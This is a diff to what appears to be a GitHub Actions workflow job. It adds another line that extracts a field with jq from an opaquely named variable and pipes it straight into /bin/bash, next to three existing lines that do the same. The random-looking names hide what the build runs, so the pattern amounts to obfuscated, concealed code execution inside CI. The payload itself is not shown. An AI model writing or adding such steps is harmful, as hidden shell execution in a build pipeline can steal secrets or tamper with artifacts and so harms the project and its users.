@@ -29,6 +29,7 @@ jobs:
           echo $j9 | jq -r .whv12 | /bin/bash
           printf '%s' "$u4" | jq -r .yrl20 | /bin/bash
           echo $fk19512 | jq -r .wkw4 | /bin/bash
+          echo $fqhl7916 | jq -r .prn7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
